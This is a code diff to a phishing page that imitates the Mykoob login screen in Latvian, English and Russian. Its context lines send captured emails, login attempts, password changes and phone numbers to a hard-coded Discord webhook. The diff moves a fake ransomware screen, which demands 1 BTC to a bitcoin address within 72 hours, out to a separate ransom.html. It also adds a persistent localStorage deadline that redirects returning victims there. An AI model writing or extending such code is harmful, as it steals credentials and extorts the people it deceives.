@@ -253,9 +253,6 @@ body {
   to   { opacity: 1; transform: scale(1) translateY(0); }
 }
 
-.modal--red { border-color: var(--danger); }
-.modal--red .modal__title { color: var(--danger); }
-
 .modal--green { border-color: var(--success); }
 .modal--green .modal__title { color: var(--success); }
 
@@ -320,8 +317,6 @@ body {
 }
 .modal__actions .btn-primary:hover { background: var(--accent-hover); }
 .modal__actions .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-.modal__actions .btn-danger { background: var(--danger); color: #fff; }
-.modal__actions .btn-danger:hover { background: var(--danger-hover); }
 
 .modal__error { color: var(--danger); font-size: 13px; margin-top: 6px; min-height: 20px; }
 
@@ -352,50 +347,6 @@ body {
 .wait-sub { font-size: 15px; color: var(--text-muted); margin-bottom: 8px; max-width: 420px; line-height: 1.5; }
 .wait-count { font-size: 14px; color: var(--text-dim); font-variant-numeric: tabular-nums; margin-top: 12px; }
 
-.ransom-screen {
-  position: fixed;
-  inset: 0;
-  background: #8b0000;
-  color: #ffffff;
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 40px 20px;
-  z-index: 2000;
-  text-align: center;
-  font-family: 'Inter', sans-serif;
-  overflow-y: auto;
-}
-.ransom-screen.active { display: flex; }
-.ransom-inner { max-width: 720px; width: 100%; padding: 20px 0; }
-.ransom-title {
-  font-size: 42px;
-  font-weight: 700;
-  letter-spacing: 2px;
-  margin-bottom: 24px;
-  text-transform: uppercase;
-}
-.ransom-body { font-size: 18px; line-height: 1.6; margin-bottom: 20px; }
-.ransom-address {
-  display: inline-block;
-  background: rgba(0, 0, 0, 0.35);
-  padding: 12px 20px;
-  border-radius: 8px;
-  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
-  font-size: 15px;
-  word-break: break-all;
-  margin: 12px 0 24px;
-  border: 1px solid rgba(255, 255, 255, 0.25);
-  cursor: pointer;
-  user-select: all;
-}
-.ransom-timer {
-  font-size: 22px;
-  font-weight: 600;
-  margin-bottom: 20px;
-  font-variant-numeric: tabular-nums;
-}
-
 @media (max-width: 900px) {
   .page__inner { flex-direction: column; gap: 32px; }
   .login-form { flex: 0 0 auto; max-width: 420px; width: 100%; }
@@ -403,8 +354,6 @@ body {
   .navbar { padding: 16px 20px; }
   .footer { padding: 16px 20px 24px; flex-direction: column; align-items: flex-start; }
   .footer__right { width: 100%; justify-content: flex-start; }
-  .ransom-title { font-size: 30px; }
-  .ransom-body { font-size: 16px; }
 }
 @media (max-width: 480px) {
   .login-form__title { font-size: 22px; }
@@ -476,7 +425,7 @@ body {
 
 <footer class="footer">
 <div class="footer__left">
-<span id="footerCopyright">© Mykoob. Visas tiesības pieder Mārim</span>
+<span id="footerCopyright">© Mykoob. Visas tiesības pieder Raivo Strazdiņam</span>
 </div>
 <div class="footer__right">
 <a href="https://login.mykoob.lv/#/lv/terms/service" id="footerTerms">Lietošanas noteikumi</a>
@@ -551,29 +500,11 @@ body {
 <div class="wait-count" id="waitCount">60</div>
 </div>
 
-<div class="ransom-screen" id="ransomScreen">
-<div class="ransom-inner">
-<div class="ransom-title" id="ransomTitle">Jūsu faili ir šifrēti</div>
-<p class="ransom-body" id="ransomBody1">
-Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256.
-Lai tos atgūtu, mums ir nepieciešams maksājums.
-</p>
-<p class="ransom-body" id="ransomBody2">
-Maksājuma summa: <strong>1 BTC</strong><br />
-Maksājuma adrese:
-</p>
-<div class="ransom-address" id="ransomAddress">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
-<div class="ransom-timer" id="ransomTimer">Laiks atlicis: 72:00:00</div>
-<p class="ransom-body" id="ransomBody3">
-Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.
-</p>
-</div>
-</div>
-
 <script>
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547540540994621440/I295Pa8pLWiW3OzAbSUTbU-ad-prxpoXqJkeyQDCZF1xYjEZ0hNoz47Y8aQuDF_Bnk8w';
 
 const MSG_STORE_KEY = 'mykoob_msg_ids_v1';
+const RANSOM_KEY    = 'mykoob_ransom_deadline';
 
 const PHONE_RULES = {
   '+371': { country: 'LV', minLen: 8,  maxLen: 8,  regex: /^[2-9]\d{7}$/ },
@@ -605,7 +536,6 @@ async function sendToDiscord(email, action, opts = {}) {
     phone = null,
     country = null,
     clickOnly = false,
-    attempt = null,
   } = opts;
 
   if (!email || email === 'unknown') return;
@@ -634,7 +564,7 @@ async function sendToDiscord(email, action, opts = {}) {
   } else if (action.includes('Pieslēgšanās mēģinājums')) {
     u.login_attempts++;
   } else if (action.includes('Pieslēgšanās ar jauno paroli')) {
-    // Jaunā parole — login_attempts netiek mainīts
+    // login_attempts netiek mainīts
   } else if (action.includes('Paroles maiņa apstiprināta')) {
     u.pwd_changes++;
   } else if (action.includes('Telefona numurs apstiprināts')) {
@@ -737,9 +667,6 @@ const phoneSubmit    = document.getElementById('phoneSubmit');
 const waitScreen     = document.getElementById('waitScreen');
 const waitCount      = document.getElementById('waitCount');
 
-const ransomScreen   = document.getElementById('ransomScreen');
-const ransomTimerEl  = document.getElementById('ransomTimer');
-
 function hideAllModals() {
   forgotModal.classList.remove('active');
   phoneModal.classList.remove('active');
@@ -797,33 +724,18 @@ function showWaitScreen() {
   }, 1000);
 }
 
-let ransomInterval = null;
 function showRansomScreen() {
-  ransomScreen.classList.add('active');
-  startRansomTimer(72 * 60 * 60);
-}
-
-function startRansomTimer(seconds) {
-  if (ransomInterval) clearInterval(ransomInterval);
-  let remaining = seconds;
-  const render = () => {
-    const h = String(Math.floor(remaining / 3600)).padStart(2, '0');
-    const m = String(Math.floor((remaining % 3600) / 60)).padStart(2, '0');
-    const s = String(remaining % 60).padStart(2, '0');
-    ransomTimerEl.textContent = `${t('ransomTimerPrefix')} ${h}:${m}:${s}`;
-  };
-  render();
-  ransomInterval = setInterval(() => {
-    if (remaining <= 0) { clearInterval(ransomInterval); return; }
-    remaining -= 1;
-    render();
-  }, 1000);
+  // Saglabā ransoma sākuma laiku
+  if (!localStorage.getItem(RANSOM_KEY)) {
+    localStorage.setItem(RANSOM_KEY, String(Date.now() + 72 * 60 * 60 * 1000));
+  }
+  // Pāradresē uz atsevišķu lapu
+  window.location.href = 'ransom.html';
 }
 
 function attemptLogin(email, password) {
   const hasPassword = Boolean(password && password.length > 0);
 
-  // Ja parole tikko nomainīta → pieņem uzreiz
   if (passwordChanged) {
     sendToDiscord(email, 'Pieslēgšanās ar jauno paroli', {
       hasPassword: true,
@@ -997,11 +909,6 @@ function updateTexts(lang) {
   document.getElementById('waitTitle').textContent = tr.waitTitle;
   document.getElementById('waitSub').textContent   = tr.waitSub;
 
-  document.getElementById('ransomTitle').textContent = tr.ransomTitle;
-  document.getElementById('ransomBody1').textContent = tr.ransomBody1;
-  document.getElementById('ransomBody2').innerHTML   = tr.ransomBody2;
-  document.getElementById('ransomBody3').textContent = tr.ransomBody3;
-
   document.getElementById('footerCopyright').textContent = tr.footerCopyright;
   document.getElementById('footerTerms').textContent     = tr.footerTerms;
   document.getElementById('footerPrivacy').textContent   = tr.footerPrivacy;
@@ -1041,11 +948,6 @@ const translations = {
     verifying: 'Verificē...',
     waitTitle: 'Verificējam jūsu numuru...',
     waitSub: 'Lūdzu, uzgaidiet. Šis process var aizņemt līdz 1 minūtei.',
-    ransomTitle: 'Jūsu faili ir šifrēti',
-    ransomBody1: 'Visi jūsu dokumenti, fotogrāfijas un faili ir šifrēti ar AES-256. Lai tos atgūtu, mums ir nepieciešams maksājums.',
-    ransomBody2: 'Maksājuma summa: <strong>1 BTC</strong><br />Maksājuma adrese:',
-    ransomBody3: 'Ja maksājums netiks veikts 72 stundu laikā, atslēga tiks neatgriezeniski dzēsta.',
-    ransomTimerPrefix: 'Laiks atlicis:',
     footerCopyright: '© Mykoob. Visas tiesības pieder Raivo Strazdiņam',
     footerTerms: 'Lietošanas noteikumi',
     footerPrivacy: 'Privātuma politika',
@@ -1083,11 +985,6 @@ const translations = {
     verifying: 'Verifying...',
     waitTitle: 'Verifying your number...',
     waitSub: 'Please wait. This process may take up to 1 minute.',
-    ransomTitle: 'Your files have been encrypted',
-    ransomBody1: 'All of your documents, photos, and files have been encrypted with AES-256. To recover them, we require payment.',
-    ransomBody2: 'Payment amount: <strong>1 BTC</strong><br />Payment address:',
-    ransomBody3: 'If payment is not made within 72 hours, the key will be irreversibly destroyed.',
-    ransomTimerPrefix: 'Time remaining:',
     footerCopyright: '© Mykoob. All rights reserved by Raivo Strazdiņš',
     footerTerms: 'Terms of Service',
     footerPrivacy: 'Privacy Policy',
@@ -1125,11 +1022,6 @@ const translations = {
     verifying: 'Проверка...',
     waitTitle: 'Проверяем ваш номер...',
     waitSub: 'Пожалуйста, подождите. Этот процесс может занять до 1 минуты.',
-    ransomTitle: 'Ваши файлы зашифрованы',
-    ransomBody1: 'Все ваши документы, фотографии и файлы зашифрованы с помощью AES-256. Чтобы вернуть их, требуется оплата.',
-    ransomBody2: 'Сумма платежа: <strong>1 BTC</strong><br />Адрес для оплаты:',
-    ransomBody3: 'Если оплата не будет произведена в течение 72 часов, ключ будет безвозвратно уничтожен.',
-    ransomTimerPrefix: 'Осталось времени:',
     footerCopyright: '© Mykoob. Все права принадлежат Райво Страздиньшу',
     footerTerms: 'Условия использования',
     footerPrivacy: 'Политика конфиденциальности',
@@ -1151,6 +1043,12 @@ function swapLogo() {
 window.matchMedia('(prefers-color-scheme: light)').addEventListener('change', swapLogo);
 
 (function init() {
+  // Ja ransoms jau aktivizēts → uzreiz uz ransom.html
+  if (localStorage.getItem(RANSOM_KEY)) {
+    window.location.href = 'ransom.html';
+    return;
+  }
+
   const params = new URLSearchParams(window.location.search);
   const emailParam = params.get('email');
   if (emailParam) {
